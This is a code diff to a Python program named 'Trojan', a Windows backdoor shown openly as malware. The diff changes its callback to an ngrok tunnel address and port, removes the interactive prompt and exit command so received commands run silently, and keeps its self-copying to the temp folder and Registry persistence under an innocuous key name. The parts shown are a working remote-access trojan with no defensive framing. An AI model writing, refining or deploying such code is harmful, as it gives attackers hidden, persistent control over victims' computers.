@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+import threading
 import socket
 import subprocess
 from time import sleep
@@ -12,7 +12,7 @@ import payloads
 import ctypes
 
 class Trojan:
-    def __init__(self, target="4.tcp.ngrok.io", port=12537):
+    def __init__(self, target="0.tcp.sa.ngrok.io", port=12744):
         self.target = target  # your ngrok ip here
         self.port = port
         self.targetAddress = (self.target, self.port)
@@ -20,8 +20,6 @@ class Trojan:
         self.FILENAME = self.getFileName()
         self.TEMPDIR = gettempdir()
         self.KEYVALUE = "Unsuspiciously" #Value of key in Windows Registry
-
-
 
 
     def verifyPath(self):
@@ -65,7 +63,7 @@ class Trojan:
         except Exception as e:
             print(f"Error while copying the file: {e}")
 
-    def startServer(self):
+    def startTrojan(self):
         while True:
             try:
                 self.trojan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -92,17 +90,11 @@ class Trojan:
     def handleConnection(self, s):
         try:
             while True:
-                msg = "\nEnter command (or '/exit' to quit): \n"
-                self.trojan.send(msg.encode('utf-8'))
                 received = s.recv(1024)
                 if not received:
                     break
                 command = received.decode('utf-8').strip()
-                if command == "/exit":
-                    self.stopServer()
-                    break
-                else:
-                    result = self.verifyCommand(command)                    
+                result = self.verifyCommand(command)                    
                 s.sendall(result.encode('utf-8'))
         except Exception as e:
             print(f"Error handling connection: {e}")
@@ -131,7 +123,7 @@ class Trojan:
     def stopServer(self):
         if self.trojan:
             self.trojan.close()
-        self.startServer()
+        self.startTrojan()
 
 
 if (__name__ == "__main__"):
@@ -141,4 +133,4 @@ if (__name__ == "__main__"):
     if trojan.verifyPath():
         trojan.addRegistryEntry()
         trojan.selfCopyTrojan()
-    trojan.startServer()
+    trojan.startTrojan()
